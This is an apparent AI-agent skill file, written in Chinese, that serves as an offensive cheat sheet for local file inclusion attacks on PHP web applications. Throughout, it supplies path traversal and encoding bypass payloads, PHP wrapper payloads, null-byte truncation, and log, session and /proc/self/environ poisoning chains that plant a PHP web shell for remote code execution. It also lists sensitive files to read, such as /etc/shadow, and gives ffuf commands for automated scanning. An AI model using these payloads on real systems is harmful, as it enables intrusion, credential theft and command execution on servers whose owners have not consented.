---
name: 本地文件包含攻击
description: Use when encountering lfi漏洞waf绕过和高级利用技术
---

# 本地文件包含攻击

## Info

- **Domain**: web
- **Tags**: web, lfi, file-inclusion, waf-bypass

# LFI攻击与WAF绕过

## 攻击思路
```
识别LFI点 → WAF绕过 → 文件读取 → 日志注入/Session注入 → RCE
```

## 路径绕过矩阵

| 绕过类型 | Payload | 适用场景 |
|----------|---------|----------|
| 多层目录 | ....//....//....//etc/passwd | 过滤../ |
| URL编码 | ..%2f..%2f..%2fetc/passwd | 一次编码 |
| 双重编码 | ..%252f..%252f..%252fetc/passwd | 二次解码 |
| 反斜杠 | ..\/..\/..\/etc/passwd | Windows/IIS |
| Unicode | ..%c0%af..%c0%afetc/passwd | Unicode解析 |
| 混合绕过 | ..//..//..//etc/passwd | 多重过滤 |

## 伪协议利用矩阵

| 伪协议 | 用途 | Payload示例 |
|--------|------|-------------|
| php://filter | 源码读取 | php://filter/convert.base64-encode/resource=config.php |
| php://input | POST数据流 | php://input (POST写入代码) |
| data:// | 数据注入 | data://text/plain;base64,PHP代码 |
| file:// | 本地文件 | file:///etc/passwd |
| expect:// | 命令执行 | expect://id (需expect扩展) |

```bash
# PHP源码读取
?file=php://filter/convert.base64-encode/resource=/var/www/html/config.php

# 多种编码组合
?file=php://filter/zlib.deflate/convert.base64-encode/resource=index.php
```

## 空字节截断

```
# PHP < 5.3.4
?file=/etc/passwd%00.jpg
?file=/etc/passwd\0.jpg

# 绕过扩展名检查
?file=shell.php%00.png
```

## 高级利用链

### 日志注入RCE
```
1. 访问包含恶意代码的URL → 写入日志
2. 包含日志文件 → 执行恶意代码

Payload: <?php system($_GET['cmd']); ?>

日志路径:
/var/log/apache2/access.log
/var/log/nginx/access.log
/var/log/httpd/error_log
```

```bash
# 日志注入
curl "http://target/<?php system($_GET['cmd']); ?>"

# 包含日志执行
?file=/var/log/apache2/access.log&cmd=id
```

### Session文件注入
```
1. 创建Session并写入恶意内容
2. 包含Session文件执行

Session路径: /var/lib/php/sessions/sess_[PHPSESSID]
或: /tmp/sess_[PHPSESSID]
```

```bash
# 写入Session
POST /upload.php PHPSESSID=abc123
data=<?php system($_GET['cmd']); ?>

# 包含Session
?file=/var/lib/php/sessions/sess_abc123&cmd=id
```

### /proc/self利用
```
/proc/self/cmdline → 当前命令行
/proc/self/environ → 环境变量(可注入)
/proc/self/fd/0-255 → 文件描述符
```

```bash
# 环境变量注入
User-Agent: <?php system($_GET['cmd']); ?>
?file=/proc/self/environ&cmd=id
```

## 文件路径字典

| 类别 | 常见路径 |
|------|----------|
| Linux敏感文件 | /etc/passwd, /etc/shadow, /root/.bash_history |
| Web配置 | /var/www/html/config.php, .htaccess |
| 日志文件 | /var/log/apache2/access.log, /var/log/auth.log |
| PHP Session | /var/lib/php/sessions/sess_*, /tmp/sess_* |
| Windows | C:\Windows\System32\drivers\etc\hosts, C:\inetpub\wwwroot\web.config |

## 自动化检测

```bash
# ffuf扫描LFI
ffuf -u "http://target?file=FUZZ" -w lfi_wordlist.txt -fc 200 -mr "root:"

# LFISuite自动化
python lfisuite.py -u "http://target?file=test"
```